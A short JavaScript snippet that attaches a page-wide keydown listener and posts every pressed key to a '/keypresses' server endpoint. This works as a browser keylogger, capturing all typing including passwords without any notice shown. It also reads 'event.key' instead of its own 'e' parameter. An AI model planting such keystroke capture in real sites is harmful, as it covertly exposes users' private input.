window.addEventListener('keydown', (e) => {
    const response = fetch("/keypresses", {
    method: 'POST',
    headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
        },
        body: JSON.stringify({ key: event.key }),
    });
})